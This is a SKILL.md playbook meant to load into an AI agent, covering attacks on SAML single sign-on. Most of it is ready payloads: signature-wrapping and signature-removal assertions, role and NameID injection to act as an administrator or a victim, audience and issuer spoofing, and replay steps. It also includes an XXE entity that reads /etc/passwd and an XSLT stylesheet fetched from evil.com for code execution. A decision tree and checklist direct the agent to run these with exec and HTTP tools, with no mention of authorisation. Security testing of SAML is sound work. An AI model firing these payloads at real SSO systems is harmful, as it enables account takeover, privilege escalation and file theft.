---
name: saml-sso-assertion-attacks
description: SAML SSO assertion attacks. Use when testing SAML-based single sign-on,
  assertion signature validation, assertion wrapping, audience restriction evasion,
  ACS endpoint handling, XML parser attacks, or certificate confusion — including
  IdP/SP trust boundary exploitation.
---

# SKILL: SAML SSO Assertion Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: SAML attack surface covers signature wrapping (XSW), signature exclusion, assertion attribute injection for privilege escalation, audience/recipient confusion, replay attacks, and XML parser vulnerabilities (XXE, XSLT) in SAML endpoints. Base models often test only signature bypass — this skill covers the full SAML trust boundary between IdP and SP.

## QUICK START

### First-pass detection

| Signal | What It Means |
|--------|---------------|
| `SAMLRequest` in URL or POST body | SP-initiated SSO flow |
| `SAMLResponse` in callback | IdP response handling |
| `/saml/callback`, `/acs`, `/sso/acs` | Assertion Consumer Service endpoint |
| `SAML2`, `Shibboleth`, `OneLogin`, `Okta`, `ADFS` headers | SAML implementation fingerprint |

### First-pass probe set

```text
1. Capture a valid SAMLResponse (authenticate normally)
2. Decode Base64 → inspect XML structure
3. Modify an attribute (e.g., role → admin) → re-encode → send
4. If accepted without error → signature not enforced on attributes
```

---

## 1. CORE CONCEPT

### SAML Flow

```
User → SP: Access protected resource
SP → User: Redirect to IdP with SAMLRequest
IdP → User: Authenticate + consent
IdP → User: POST SAMLResponse to ACS endpoint
SP: Validate assertion → create session → grant access
```

### SAML Assertion Structure

```xml
<samlp:Response ID="_123" ...>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion ID="_456" ...>
    <saml:Subject>
      <saml:NameID>user@company.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <saml:Conditions NotOnOrAfter="..." NotBefore="...">
      <saml:AudienceRestriction>
        <saml:Audience>https://sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>
```

---

## 2. SIGNATURE VALIDATION BYPASS

### Signature Wrapping (XSW Attacks)

```xml
<!-- XSW-2: Move signed assertion, inject unsigned one -->
<samlp:Response ID="_123">
  <!-- Attacker's unsigned assertion (processed by SP) -->
  <saml:Assertion ID="evil">
    <saml:Subject>
      <saml:NameID>admin@company.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <!-- Original signed assertion (signature verifies but ignored) -->
  <ds:Signature Reference="#_456">...</ds:Signature>
  <saml:Assertion ID="_456">...</saml:Assertion>
</samlp:Response>
```

### Signature Exclusion

```xml
<!-- Remove Signature element entirely -->
<samlp:Response ID="_123">
  <saml:Assertion ID="_456">
    <saml:Subject>
      <saml:NameID>admin@company.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- If SP doesn't require signature → assertion accepted -->
```

### Common XSW Variants

| Variant | Technique |
|---------|-----------|
| XSW-2 | Inject unsigned assertion before signed one |
| XSW-3 | Move signature to point to wrong assertion |
| XSW-4 | Wrap signed assertion inside unsigned extension |
| XSW-8 | Duplicate assertion with modified attributes |
| XSW-11 | Move signature to Response level (not Assertion) |

---

## 3. ASSERTION MANIPULATION

### Role/Group Injection

```xml
<!-- Modify AttributeStatement in captured assertion: -->
<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="group">
    <saml:AttributeValue>Domain Admins</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

### NameID Manipulation

```xml
<!-- Change user identity: -->
<saml:NameID>victim@company.com</saml:NameID>
<!-- If signature doesn't cover NameID or is not verified: -->
<!-- Attacker logs in as victim -->
```

### Custom Attribute Injection

```xml
<!-- Inject attributes the SP might trust: -->
<saml:Attribute Name="email">
  <saml:AttributeValue>attacker@evil.com</saml:AttributeValue>
</saml:Attribute>
<saml:Attribute Name="department">
  <saml:AttributeValue>IT</saml:AttributeValue>
</saml:Attribute>
```

---

## 4. AUDIENCE AND RECIPIENT CONFUSION

### Audience Restriction Bypass

```xml
<!-- Original: -->
<saml:Audience>https://sp.example.com</saml:Audience>
<!-- Modified: -->
<saml:Audience>https://evil-sp.example.com</saml:Audience>
<!-- If SP doesn't validate audience → assertion accepted for wrong SP -->
```

### Recipient / ACS URL Manipulation

```xml
<!-- Modify SubjectConfirmation Recipient: -->
<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
  <saml:SubjectConfirmationData
    Recipient="https://evil-sp.example.com/acs"
    NotOnOrAfter="2025-12-31T00:00:00Z"/>
</saml:SubjectConfirmation>
<!-- If SP doesn't validate Recipient matches its ACS URL → accepted -->
```

---

## 5. REPLAY ATTACKS

### Expired Assertion Replay

```xml
<!-- If SP doesn't check NotOnOrAfter: -->
<!-- Capture valid assertion → replay hours/days later -->
<saml:Conditions NotOnOrAfter="2024-01-01T00:00:00Z">
  <!-- SP accepts expired assertion -->
</saml:Conditions>
```

### Assertion ID Replay

```text
# SP should maintain cache of used Assertion IDs
# If no replay detection:
# 1. Capture valid SAMLResponse
# 2. Replay the same response multiple times
# 3. Each replay creates a new authenticated session
```

---

## 6. XML PARSER ATTACKS

### XXE via SAML

```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- If XML parser has external entities enabled → file read -->
```

### XSLT Injection

```xml
<?xml-stylesheet type="text/xsl" href="https://evil.com/evil.xsl"?>
<samlp:Response>
  <!-- If XSLT processing is enabled on SAML endpoint → RCE -->
</samlp:Response>
```

---

## 7. CERTIFICATE AND KEY CONFUSION

### Self-Signed Certificate Injection

```xml
<ds:Signature>
  <ds:KeyInfo>
    <ds:X509Data>
      <ds:X509Certificate>
        <!-- Attacker's self-signed certificate -->
        MIID...
      </ds:X509Certificate>
    </ds:X509Data>
  </ds:KeyInfo>
  <ds:SignatureValue>...</ds:SignatureValue>
</ds:Signature>
<!-- If SP doesn't validate certificate against trusted IdP certs → accepted -->
```

### Key Rollover Abuse

```text
# During key rollover, SP may accept signatures from both old and new keys
# If old key is compromised or leaked → attacker signs assertions with old key
# Some SPs accept any certificate in KeyInfo → always trust attack
```

---

## 8. IdP/SP CONFUSION

### Metadata Manipulation

```text
# SAML metadata exchange between IdP and SP:
# If SP accepts metadata updates without verification:
# 1. Attacker registers malicious IdP metadata
# 2. SP trusts attacker's IdP for authentication
# 3. Attacker controls all assertions
```

### Entity ID Spoofing

```xml
<!-- Modify Issuer in assertion: -->
<saml:Issuer>https://evil-idp.com</saml:Issuer>
<!-- If SP doesn't validate Issuer matches trusted IdP → accepts from any IdP -->
```

---

## DECISION TREE

```
Found SAML endpoint (SAMLRequest/SAMLResponse)?
├── Capture valid SAML flow (authenticate normally)
├── Decode and inspect assertion XML structure
│
├── Signature validation?
│   ├── Remove signature entirely → still accepted? (signature exclusion)
│   ├── XSW-2: inject unsigned assertion → SP uses unsigned one?
│   ├── Inject self-signed cert in KeyInfo → accepted?
│   └── Signature covers only Response, not Assertion?
│
├── Assertion attributes?
│   ├── Modify role/group → admin access?
│   ├── Change NameID → access as different user?
│   └── Inject custom attributes → trusted by SP?
│
├── Time/Replay?
│   ├── Replay expired assertion → accepted?
│   ├── Reuse same Assertion ID → accepted?
│   └── Remove NotOnOrAfter → accepted?
│
├── Trust boundaries?
│   ├── Modify Audience → accepted for wrong SP?
│   ├── Modify Recipient → accepted at wrong ACS?
│   ├── Change Issuer → accepted from wrong IdP?
│   └── Register malicious IdP metadata → trusted?
│
└── XML parser?
    ├── XXE payload in NameID → file read?
    └── XSLT stylesheet → code execution?
```

---

## TESTING CHECKLIST

- [ ] Capture complete SAML flow (request + response)
- [ ] Decode and inspect SAMLResponse XML structure
- [ ] Test signature exclusion (remove ds:Signature)
- [ ] Test XSW-2 (inject unsigned assertion before signed one)
- [ ] Test attribute injection (modify role, group, email)
- [ ] Test NameID manipulation (different user identity)
- [ ] Test audience restriction bypass (wrong SP entity ID)
- [ ] Test recipient/ACS URL mismatch
- [ ] Test replay (re-send captured assertion)
- [ ] Test expired assertion acceptance
- [ ] Test XXE via SAML XML (external entity injection)
- [ ] Test certificate validation (self-signed cert injection)
- [ ] Verify Issuer matches trusted IdP entity ID

---

## TARGET TOOL ADAPTATION

Use visible `http-framework-test`, `execute-python-script`, or `exec` tools for low-impact assertion decoding and controlled ACS replay. Browser or proxy-assisted observation is optional and only applies when that capability is actually visible; do not assume a Burp or browser MCP exists.

---

## RELATED ROUTING

- [XXE Attacks](../xxe-xml-external-entity/SKILL.md) — when XML parser in SAML endpoint is vulnerable to XXE
- [OAuth/OIDC Misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — when OAuth-based SSO is in use instead of SAML
- [JWT/OAuth Token Attacks](../jwt-oauth-token-attacks/SKILL.md) — when JWT tokens are used alongside SAML
- [Auth Bypass](../authbypass-authentication-flaws/SKILL.md) — general authentication bypass patterns
